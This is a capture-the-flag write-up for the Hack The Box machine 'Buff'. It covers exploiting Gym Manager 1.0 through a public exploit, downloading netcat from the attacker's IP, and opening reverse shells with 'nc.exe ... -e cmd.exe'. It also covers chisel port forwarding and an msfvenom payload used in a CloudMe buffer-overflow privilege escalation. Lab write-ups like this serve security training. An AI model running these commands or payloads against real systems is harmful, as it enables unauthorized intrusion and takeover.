+++
title = "HTB - Buff"
+++

<h1> <span style="color:#da1953">HTB</span> - Buff</h1>

![Cover](/writeups/htb_buff/cover.png)

<h1> <span style="color:#da1953">Ind</span>ex</h1>

- [Scanning](#SCAN)
- [Exploiting Gym Manager](#EXPGYM)
- [Upgrading the shell](#UPSHELL)
- [User flag](#UFLAG)
- [Privilege escalation](#PRIVESC)
  - [Search vulnerable process](#VULNPROC)
  - [Finding CloudMe version](#CLOUDVER)
  - [Port forwarding](#PORTFW)
  - [Local exploitation](#LOCALEXP)

<h1 id=SCAN> <span style="color:#da1953">Sca</span>nning</h1>

```text
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
```

<h1 id=EXPGYM> <span style="color:#da1953">Exp</span>loiting Gym Manager</h1>

The scannig reveals that there is a webserver running on port 8080 so I go to check it hoping to find some interesting information.  
In the page *contact* there is a information about the sofware used to build the site which is:<br>
`Gym Manager Software 1.0`.

![CMS](/writeups/htb_buff/1.png)

Searching a vulnerability or and exploit for, it leads me in [https://www.exploit-db.com/exploits/48506](https://www.exploit-db.com/exploits/48506).  
Then I donwloaded and run it as `python 48506.py http://10.10.10.198:8080/` and it ended up exploiting the software and giving me a shell.  
I can't do much with this shell, I cant change directory or do any other stuff so I need to upgrade the shell.

<h1 id=UPSHELL> <span style="color:#da1953">Upg</span>rading the shell</h1>

In order to do so I decided to download netcat (nc) to the server and it includes few steps:

1. Open a webserver in my kali inside my Buff folder that I created to solve the box where I have all the exploits and programs `sudo python3 -m http.server 8080`
    ![Python Web Server.png](/writeups/htb_buff/2.png)
2. From the box I can connect to the python http server and download file, to do that there are two ways:
    1. `powershell iwr http://10.10.14.197:8080:/nc.exe -outf nc.exe`
    2. `curl http://10.10.14.197:8080/nc.exe -o nc.exe`<br><br>
        ![Download.png](/writeups/htb_buff/3.png)  
        In the directory there are also other users artifacts.

Once Downloaded I open a listener on my kali `nc -lvp 4444` and a client on the box in a way that upon connecting it will execute a command `nc.exe 10.10.14.197 4444 -e cmd.exe` it will result on havin a command of the box on my kali machine.

![Exploit](/writeups/htb_buff/4.png)

<h1 id=UFLAG> <span style="color:#da1953">Use</span>r flag</h1>

Once got the shell I can move to the location of the user flag.

![User flag](/writeups/htb_buff/5.png)

<h1 id=PRIVESC> <span style="color:#da1953">Pri</span>vilege escalation</h1>

<h2 id=VULNPROC>Search vulnerable process</h2>

To search a vulnerable process its possible to use `winpeas.exe` but in my case I checked one by one and search for them on google to see which one is vulnerable and I ended up finding `CloudMe.exe`.

Searching for an exploit I ended up finding many and various version of cloudme’s version.

<h2 id=CLOUDVER>Finding CloudMe version</h2>

While I dont have administrator provilege I cant see the version of the program with `tasklist` or `Get-Proces` so I had to look around to see if I find something.  
At the end the executable was in the `shaun` user’s Download folder, which contains also the version nuber in the name.

![Finding Cloudme version](/writeups/htb_buff/6.png)

<h2 id=PORTFW>Port forwarding</h2>

I noticed that CloudMe runs on localhost port 8888 so there is no chance that I can remotly exploit it and neither locally because the script is in python and python is not installed in the box.  
So I used `chisel` to forward the connection. I had to donwloaded a precompiled version for windows and linux from [https://github.com/jpillora/chisel/releases/](https://github.com/jpillora/chisel/releases/).  
I loaded chisel in the box in the same way as nc.  
From my kali machine I opened a server as shown in [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)  
`./chisel server -p 7777 --reverse` and a client in the box as `chisel client 10.10.14.187:7777 R:8888:127.0.0.1:8888`

![Chisel port forwarding](/writeups/htb_buff/7.png)

<h2 id=LOCALEXP>Local Exploitation</h2>

Now my choice of exploit comes down to four possibilities.

![Local exploit](/writeups/htb_buff/8.png)  
And I choosed the PoC one.  
After opening the exploit it suggest a command line to enerate a shellcode, so I generated a shellcode that I need in order to exploit CloudMe and give a reverseshell.  
`msfvenom -a x86 -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.197 1111 -e cmd.exe' -b '\x00\x0A\x0D' -f python`  
Now I have replaced the new shell code with the old one inside the script.  
Once exploited the CloudMe it will invoke nc.exe and try to connect to my kali machine so befor that I have to linste in port 1111.  
And run the exploit from another shell.  

![Privilege escalation](/writeups/htb_buff/9.png)  
And the root flag is in the administrator desktop.
